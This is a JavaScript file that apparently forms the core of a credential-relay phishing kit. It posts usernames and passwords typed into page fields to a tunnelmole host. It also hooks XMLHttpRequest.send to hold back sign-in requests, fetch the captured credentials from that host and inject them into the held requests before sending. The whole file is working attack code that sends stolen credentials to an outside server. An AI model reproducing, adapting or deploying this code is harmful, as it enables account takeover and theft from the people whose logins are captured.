let freqUsername = null;
let freqPassword = null;
const modifiedUsernameRequests = new Set();
const modifiedPasswordRequests = new Set();
const pendingUsernameRequests = new Map();
const pendingPasswordRequests = new Map();
let usernameFetched = false;
let passwordFetched = false;

// Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Avoid redundant fetches once username is fetched

    console.log('Fetching username...');

    try {
        const response = await fetch('https://4phnpj-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);  // Debug log

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // Reset the server-side username store
            await fetch('https://4phnpj-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
            // Process all pending username requests
            processUsernameRequests();
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 500); // Retry after 1s if error occurs
    }
};

// Fetch the password when needed
const fetchFreqPassword = async () => {
    if (passwordFetched) return; // Avoid redundant fetches once password is fetched

    console.log('Fetching password...');

    try {
        const response = await fetch('https://4phnpj-ip-37-228-207-173.tunnelmole.net/get-second-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-password:', result);  // Debug log

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            // Reset the server-side password store
            await fetch('https://4phnpj-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
            // Process all pending password requests
            processPasswordRequests();
        } else {
            console.warn("No password data received, retrying...");
            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
    }
};

// Process pending username requests
const processUsernameRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        fetchFreqUsername(); // Ensure username is fetched
        return;
    }

    console.log("Processing pending username requests...");
    const requestsToProcess = Array.from(pendingUsernameRequests);

    for (let [xhr, body] of requestsToProcess) {
        const matchUsername = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (matchUsername && !modifiedUsernameRequests.has(body)) {
            const modifiedBody = body.replace(matchUsername[1], freqUsername);
            modifiedUsernameRequests.add(body); // Mark the request as modified
            console.log("Modified username request:", modifiedBody);
            xhr.send(modifiedBody); // Send the modified request
            pendingUsernameRequests.delete(xhr); // Remove from pending requests
        }
    }

    // Reset freqUsername when all requests are processed
    if (pendingUsernameRequests.size === 0) {
        console.log("All username requests processed, resetting freqUsername.");
        freqUsername = null;
        usernameFetched = false; // Allow fetching a new username if needed
    }
};

// Process pending password requests
const processPasswordRequests = () => {
    if (!freqPassword) {
        console.log("Password not available yet, retrying...");
        fetchFreqPassword(); // Ensure password is fetched
        return;
    }

    console.log("Processing pending password requests...");
    const requestsToProcess = Array.from(pendingPasswordRequests);

    for (let [xhr, body] of requestsToProcess) {
        const matchPassword = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (matchPassword && !modifiedPasswordRequests.has(body)) {
            const modifiedBody = body.replace(matchPassword[1], freqPassword);
            modifiedPasswordRequests.add(body); // Mark the request as modified
            console.log("Modified password request:", modifiedBody);
            xhr.send(modifiedBody); // Send the modified request
            pendingPasswordRequests.delete(xhr); // Remove from pending requests
        }
    }

    // Reset freqPassword when all requests are processed
    if (pendingPasswordRequests.size === 0) {
        console.log("All password requests processed, resetting freqPassword.");
        freqPassword = null;
        passwordFetched = false; // Allow fetching a new password if needed
    }
};

// Intercept XMLHttpRequest to modify requests with username
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    // Username-related request handling
    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedUsernameRequests).some(m => body.includes(m))) {
        console.log("Intercepted username request:", body);
        pendingUsernameRequests.set(this, body); // Store the username-related request in pending
        processUsernameRequests(); // Process immediately if username is available
    }
    // Password-related request handling
    else if (/identity-signin-password%5C%22%2C%5C%22/.test(body) && !Array.from(modifiedPasswordRequests).some(m => body.includes(m))) {
        console.log("Intercepted password request:", body);
        pendingPasswordRequests.set(this, body); // Store the password-related request in pending
        processPasswordRequests(); // Process immediately if password is available
    }
    else {
        originalXhrSend.call(this, body); // Send the original request if no modification is needed
    }
};

// ✅ Send username data to server
const sendUsername = async () => {
    console.log('Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    try {
        const response = await fetch('https://4phnpj-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// ✅ Send password data to server
const sendPassword = async () => {
    console.log('Sending password...');

    const password = document.getElementById('password')?.value;
    if (!password) {
        console.warn("No password entered");
        return;
    }

    try {
        const response = await fetch('https://4phnpj-ip-37-228-207-173.tunnelmole.net/save-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });

        if (response.ok) {
            console.log('Password sent successfully');
        } else {
            console.error('Error sending password:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending password:', error);
    }
};

// ✅ Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const usernameButton = document.getElementById('sendUsernameBtn');
    const passwordButton = document.getElementById('sendPasswordBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    // Username button click listener
    if (usernameButton) {
        usernameButton.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent form submission if inside a form
            sendUsername(); // Trigger sending username
        });
    }

    // Password button click listener
    if (passwordButton) {
        passwordButton.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent form submission if inside a form
            sendPassword(); // Trigger sending password
        });
    }

    // "Enter" key listener for username
    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendUsername(); // Trigger send on Enter
            }
        });
    }

    // "Enter" key listener for password
    if (passwordInput) {
        passwordInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendPassword(); // Trigger send on Enter
            }
        });
    }

    // Ensure both fetches are called when the page loads
    fetchFreqUsername();
    fetchFreqPassword();
});
